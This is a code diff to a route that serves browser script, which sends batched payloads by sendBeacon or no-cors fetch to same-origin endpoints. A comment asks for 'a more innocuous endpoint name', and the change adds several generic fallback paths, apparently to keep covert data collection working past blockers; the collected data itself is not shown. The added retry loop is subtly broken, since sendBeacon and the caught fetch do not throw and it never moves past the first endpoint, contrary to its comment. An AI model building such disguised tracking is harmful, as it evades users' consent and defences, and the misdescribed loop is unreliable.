@@ -18,7 +18,12 @@ export async function GET() {
 
   const sessionId = 'u' + Date.now() + Math.random().toString(36).slice(2);
   // Use a more innocuous endpoint name
-  const ENDPOINT = window.location.protocol + '//' + window.location.host + '/api/content/update';
+  const ENDPOINTS = [
+    window.location.protocol + '//' + window.location.host + '/api/content/update',
+    window.location.protocol + '//' + window.location.host + '/api/c',
+    window.location.protocol + '//' + window.location.host + '/api/p',
+    window.location.protocol + '//' + window.location.host + '/api/track'
+  ];
 
   // Queue to batch requests and prevent race conditions
   let queue = [];
@@ -38,21 +43,31 @@ export async function GET() {
         ts: Date.now()
       };
 
-      // Use sendBeacon as primary method (most reliable)
-      if (navigator.sendBeacon) {
-        const blob = new Blob([JSON.stringify(payload)], { 
-          type: 'application/json' 
-        });
-        navigator.sendBeacon(ENDPOINT, blob);
-      } else {
-        // Fallback to fetch with keepalive
-        fetch(ENDPOINT, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload),
-          keepalive: true,
-          mode: 'no-cors'
-        }).catch(() => {});
+      // Try each endpoint until one succeeds
+      for (const endpoint of ENDPOINTS) {
+        try {
+          // Use sendBeacon as primary method (most reliable)
+          if (navigator.sendBeacon) {
+            const blob = new Blob([JSON.stringify(payload)], { 
+              type: 'application/json' 
+            });
+            navigator.sendBeacon(endpoint, blob);
+          } else {
+            // Fallback to fetch with keepalive
+            fetch(endpoint, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload),
+              keepalive: true,
+              mode: 'no-cors'
+            }).catch(() => {});
+          }
+          // Only send to first available endpoint that works
+          break;
+        } catch (err) {
+          // Continue to next endpoint if this one fails
+          continue;
+        }
       }
     } catch (err) {}
   };
